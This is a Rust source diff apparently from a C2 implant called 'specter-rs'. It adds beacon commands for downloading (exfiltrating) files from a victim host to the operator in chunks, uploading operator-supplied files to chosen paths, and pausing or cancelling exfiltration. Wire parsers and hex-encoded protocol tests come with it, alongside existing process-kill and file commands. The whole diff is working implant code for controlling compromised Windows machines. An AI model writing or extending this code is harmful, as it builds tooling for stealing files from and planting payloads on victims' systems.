@@ -126,6 +126,22 @@ pub const COMMAND_GETUID: u32 = 22;
 pub const COMMAND_DISKS: u32 = 15;
 pub const COMMAND_PS_LIST: u32 = 41;
 pub const COMMAND_PS_KILL: u32 = 42;
+pub const COMMAND_DOWNLOAD: u32 = 32;
+pub const COMMAND_UPLOAD: u32 = 33;
+pub const COMMAND_EXFIL: u32 = 35;
+/// Server-side memory chunking of upload payloads (docs/WIRE.md).
+pub const COMMAND_SAVEMEMORY: u32 = 0x2321;
+
+/// Download progress states (native pl_utils.go).
+pub const DOWNLOAD_START: u8 = 1;
+pub const DOWNLOAD_CONTINUE: u8 = 2;
+pub const DOWNLOAD_FINISH: u8 = 3;
+
+/// Exfil/download session states (axc2 SDK).
+pub const EXFIL_RUNNING: u8 = 1;
+pub const EXFIL_STOPPED: u8 = 2;
+pub const EXFIL_FINISHED: u8 = 3;
+pub const EXFIL_CANCELED: u8 = 4;
 /// Beacon-side error report: `{COMMAND_ERROR, win32 error code}`.
 pub const COMMAND_ERROR: u32 = 0x1111_FFFF;
 
@@ -175,6 +191,16 @@ pub enum Task {
     PsList,
     /// `COMMAND_PS_KILL` with the target pid.
     PsKill { pid: u32 },
+    /// `COMMAND_DOWNLOAD` with the file to stream.
+    Download { path_len: u16, path: [u8; PATH_CAP] },
+    /// `COMMAND_UPLOAD` with the memory id and the destination path.
+    Upload {
+        memory_id: u32,
+        path_len: u16,
+        path: [u8; PATH_CAP],
+    },
+    /// `COMMAND_EXFIL` with the state and the download id.
+    Exfil { action: u8, file_id: u32 },
 }
 
 impl Task {
@@ -186,7 +212,9 @@ impl Task {
             | Task::Ls { path_len, path }
             | Task::Cat { path_len, path }
             | Task::Mkdir { path_len, path }
-            | Task::Rm { path_len, path } => &path[..*path_len as usize],
+            | Task::Rm { path_len, path }
+            | Task::Download { path_len, path }
+            | Task::Upload { path_len, path, .. } => &path[..*path_len as usize],
             Task::Cp { src_len, src, .. } | Task::Mv { src_len, src, .. } => {
                 &src[..*src_len as usize]
             }
@@ -296,6 +324,24 @@ pub fn parse_task(r: &mut Reader) -> Option<(Task, u32)> {
             let pid = r.u32_le()?;
             Task::PsKill { pid }
         }
+        COMMAND_DOWNLOAD => {
+            let (path_len, path) = pack_string(r)?;
+            Task::Download { path_len, path }
+        }
+        COMMAND_UPLOAD => {
+            let memory_id = r.u32_le()?;
+            let (path_len, path) = pack_string(r)?;
+            Task::Upload {
+                memory_id,
+                path_len,
+                path,
+            }
+        }
+        COMMAND_EXFIL => {
+            let action = r.u8()?;
+            let file_id = r.u32_le()?;
+            Task::Exfil { action, file_id }
+        }
         _ => return None,
     };
     let id = r.u32_le()?;
@@ -329,6 +375,62 @@ pub fn push_rm_result(w: &mut Writer, task_id: u32, was_dir: bool) -> bool {
 }
 
 /// CP/MV result: the header alone — the server renders the fixed message.
+/// A SAVEMEMORY chunk: `[COMMAND_SAVEMEMORY, memoryId, bufferSize,
+/// chunkLen, chunk]` followed by the `u32 LE taskId` every task record
+/// carries — the borrowed chunk must be consumed before the response
+/// buffer moves. Returns `(memoryId, expected total, chunk)`.
+pub fn parse_save_memory<'a>(r: &mut Reader<'a>) -> Option<(u32, usize, &'a [u8])> {
+    let command = r.u32_le()?;
+    if command != COMMAND_SAVEMEMORY {
+        return None;
+    }
+    let memory_id = r.u32_le()?;
+    let expected = r.u32_le()? as usize;
+    let chunk_len = r.u32_le()? as usize;
+    let chunk = r.take(chunk_len)?;
+    let _task_id = r.u32_le()?;
+    Some((memory_id, expected, chunk))
+}
+
+/// DOWNLOAD progress record: `int fileId || byte state` then per state:
+/// START `long size || array name`, CONTINUE `array chunk`, FINISH ``.
+pub fn push_download_start(
+    w: &mut Writer,
+    task_id: u32,
+    file_id: u32,
+    size: u64,
+    name: &[u8],
+) -> bool {
+    push_result_header(w, task_id, COMMAND_DOWNLOAD)
+        && w.u32(file_id)
+        && w.u8(DOWNLOAD_START)
+        && w.u64(size)
+        && w.array(name)
+}
+
+pub fn push_download_continue(w: &mut Writer, task_id: u32, file_id: u32, chunk: &[u8]) -> bool {
+    push_result_header(w, task_id, COMMAND_DOWNLOAD)
+        && w.u32(file_id)
+        && w.u8(DOWNLOAD_CONTINUE)
+        && w.array(chunk)
+}
+
+pub fn push_download_finish(w: &mut Writer, task_id: u32, file_id: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_DOWNLOAD) && w.u32(file_id) && w.u8(DOWNLOAD_FINISH)
+}
+
+/// EXFIL control ack: `int fileId || byte state` — the server renders
+/// the stop/resume/cancel message.
+pub fn push_exfil_result(w: &mut Writer, task_id: u32, file_id: u32, state: u8) -> bool {
+    push_result_header(w, task_id, COMMAND_EXFIL) && w.u32(file_id) && w.u8(state)
+}
+
+/// UPLOAD ack: the header alone ("File successfully uploaded" server-side,
+/// plus the file browser refresh).
+pub fn push_upload_result(w: &mut Writer, task_id: u32) -> bool {
+    push_result_header(w, task_id, COMMAND_UPLOAD)
+}
+
 pub fn push_plain_result(w: &mut Writer, task_id: u32, command_id: u32) -> bool {
     push_result_header(w, task_id, command_id)
 }
@@ -711,6 +813,21 @@ mod tests {
                 b"C:\\dir".as_slice(),
             ),
             (
+                Task::Download {
+                    path_len: l,
+                    path: p,
+                },
+                b"C:\\dir".as_slice(),
+            ),
+            (
+                Task::Upload {
+                    memory_id: 7,
+                    path_len: l,
+                    path: p,
+                },
+                b"C:\\dir".as_slice(),
+            ),
+            (
                 Task::Cp {
                     src_len: sl,
                     src: sd,
@@ -752,6 +869,43 @@ mod tests {
             .dst(),
             b"C:\\dst.txt".as_slice()
         );
+    }
+
+    /// Upload task from the Go reference (PackArray int+int+string, the
+    /// createTaskCommandSaveMemory flow): `[33, memoryId, fileName]`.
+    #[test]
+    fn parse_task_upload_from_go_reference() {
+        // upload, memoryId 0x766ad211, "C:\uploaded.txt", taskId 1.
+        let bytes = hex("2100000011d26a7610000000433a5c75706c6f616465642e7478740001000000");
+        let mut r = Reader::new(&bytes);
+        let (task, id) = parse_task(&mut r).unwrap();
+        match task {
+            Task::Upload {
+                memory_id,
+                path_len,
+                ..
+            } => {
+                assert_eq!(memory_id, 0x766A_D211);
+                assert_eq!(path_len, 15);
+            }
+            _ => panic!("wrong variant: {task:?}"),
+        }
+        assert_eq!(task.path(), b"C:\\uploaded.txt");
+        assert_eq!(id, 1);
+        assert_eq!(r.remaining(), 0);
+    }
+
+    /// A SAVEMEMORY chunk from the Go reference (createTaskCommandSaveMemory).
+    #[test]
+    fn parse_save_memory_from_go_reference() {
+        // [0x2321, memoryId 5, total 10, chunkLen 10, "specter-rs"] + taskId 7
+        let bytes = hex("21230000050000000a0000000a000000737065637465722d727307000000");
+        let mut r = Reader::new(&bytes);
+        let (memory_id, expected, chunk) = parse_save_memory(&mut r).unwrap();
+        assert_eq!(memory_id, 5);
+        assert_eq!(expected, 10);
+        assert_eq!(chunk, b"specter-rs");
+        assert_eq!(r.remaining(), 0);
     }
 
     #[test]
